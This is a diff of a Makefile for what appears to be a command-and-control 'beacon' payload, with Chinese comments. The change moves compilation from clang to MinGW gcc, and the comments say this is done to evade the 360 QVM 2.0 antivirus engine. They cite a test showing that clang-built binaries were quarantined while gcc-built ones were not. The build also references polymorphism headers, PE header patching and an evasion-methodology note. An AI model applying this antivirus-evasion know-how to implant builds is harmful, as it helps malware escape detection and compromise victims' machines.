@@ -6,9 +6,22 @@
 # 而不是给它加 `#ifdef` 守卫 —— 它本来就不该进载荷。
 SOURCES := $(filter-out beacon/config.cpp beacon/test_x86_peb.cpp, $(wildcard beacon/*.cpp))
 
-# Clang cross to MinGW (Kharon-style fingerprint); do not use -masm=intel globally — breaks Win headers + Clang.
-CXX_X64 := clang++ -target x86_64-w64-mingw32
-CXX_X86 := clang++ -target i686-w64-mingw32
+# ★★ 编译器必须来自 buildenv.mk —— 那里是**唯一真相源**，别再手写编译器名。
+#
+#   为什么必须是 mingw gcc 而不是 clang：360 QVM 2.0 标的是**编译器指纹**。
+#   A/B 单变量实测（2026-07-10）：同一个最小 WinMain+Sleep，clang++ -target 编 → 判 9B7A 隔离；
+#   gcc 编 → 干净。这条指纹在 PE 头表面修补（pe_header_mod 的 Rich/normalize）之下，
+#   改不动 —— 所以只要 objects 还用 clang 编，载荷就一定会被标，其它免杀手段都是白搭。
+#   `-Os` 是同一版留下的，buildenv.mk 里是 `-O2`。
+#
+#   ★ 这个缺口 2026-07 修过一次，又被后来的合并覆盖回来了（见 memory qvm2-evasion-methodology
+#     与 project-git-v15 记的"源码 vs 记忆缺口"）。别再手写编译器名。
+#
+#   -masm=intel 不要放全局（会破坏 Windows 头）；只有 crt.cpp 那条规则局部加。
+include ../buildenv.mk
+
+CXX_X64 := $(BEACON_CC_X64)
+CXX_X86 := $(BEACON_CC_X86)
 
 # Do not wrap these in quotes — they become part of $@ and break NASM -o paths.
 BEACON_DIR := beacon
@@ -71,7 +84,7 @@ EXTRA_FLAGS ?=
 
 COMMON_FLAGS := -I $(BEACON_DIR) \
                 -include beacon/DynamicPolymorphism.h \
-                -Os \
+                $(BEACON_OPTIM) \
                 -fno-lto \
                 -falign-functions=1 \
                 -ffunction-sections \
